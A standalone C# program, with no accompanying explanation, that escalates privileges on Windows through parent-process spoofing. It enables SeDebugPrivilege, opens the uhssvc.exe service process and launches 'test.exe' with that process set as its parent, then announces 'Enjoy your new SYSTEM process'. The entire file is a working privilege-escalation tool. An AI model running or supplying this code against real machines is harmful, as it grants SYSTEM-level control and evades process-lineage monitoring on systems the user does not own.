using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class Program
{
    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
        public LUID_AND_ATTRIBUTES[] Privileges;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
    public struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
    public struct PROCESSENTRY32
    {
        public uint dwSize;
        public uint cntUsage;
        public uint th32ProcessID;
        public IntPtr th32DefaultHeapID;
        public uint th32ModuleID;
        public uint cntThreads;
        public uint th32ParentProcessID;
        public int pcPriClassBase;
        public uint dwFlags;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szExeFile;
    }

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    const uint TOKEN_QUERY = 0x0008;
    const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    const uint PROCESS_CREATE_PROCESS = 0x0080;
    const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    const uint PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
    const uint TH32CS_SNAPPROCESS = 0x00000002;

    static void Main()
    {
        int pid = FindProcessId("uhssvc.exe");
        if (pid == 0)
        {
            Console.WriteLine("Error: Could not find uhssvc.exe process");
            return;
        }

        if (!EnableDebugPrivilege())
        {
            Console.WriteLine("Failed to enable SeDebugPrivilege");
            return;
        }

        IntPtr parentHandle = OpenProcess(PROCESS_CREATE_PROCESS, false, pid);
        if (parentHandle == IntPtr.Zero)
        {
            Console.WriteLine(string.Format("Error opening PID {0} (Error Code: {1})", pid, Marshal.GetLastWin32Error()));
            return;
        }

        STARTUPINFOEX si = new STARTUPINFOEX();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        IntPtr lpSize = IntPtr.Zero;

        InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
        si.lpAttributeList = Marshal.AllocHGlobal(lpSize);
        InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, ref lpSize);

        IntPtr parentHandlePtr = Marshal.AllocHGlobal(IntPtr.Size);
        Marshal.WriteIntPtr(parentHandlePtr, parentHandle);
        UpdateProcThreadAttribute(si.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, parentHandlePtr, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

        si.StartupInfo.cb = Marshal.SizeOf(si);

        bool ret = CreateProcess(null, "test.exe", IntPtr.Zero, IntPtr.Zero, true, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref si, out pi);

        if (!ret)
        {
            Console.WriteLine(string.Format("Error creating new process ({0})", Marshal.GetLastWin32Error()));
            return;
        }

        Console.WriteLine("Enjoy your new SYSTEM process");

        Marshal.FreeHGlobal(si.lpAttributeList);
        Marshal.FreeHGlobal(parentHandlePtr);

        CloseHandle(parentHandle);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    static bool EnableDebugPrivilege()
    {
        IntPtr hToken;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
        {
            return false;
        }

        LUID luid;
        if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out luid))
        {
            CloseHandle(hToken);
            return false;
        }

        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
        {
            PrivilegeCount = 1,
            Privileges = new LUID_AND_ATTRIBUTES[1]
        };
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if (!AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
        {
            CloseHandle(hToken);
            return false;
        }

        CloseHandle(hToken);
        return true;
    }

    static int FindProcessId(string processName)
    {
        IntPtr hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == IntPtr.Zero)
        {
            return 0;
        }

        PROCESSENTRY32 pe = new PROCESSENTRY32();
        pe.dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32));

        if (!Process32First(hSnapshot, ref pe))
        {
            CloseHandle(hSnapshot);
            return 0;
        }

        int pid = 0;
        do
        {
            if (string.Compare(pe.szExeFile, processName, StringComparison.OrdinalIgnoreCase) == 0)
            {
                pid = (int)pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, ref pe));

        CloseHandle(hSnapshot);
        return pid;
    }
}
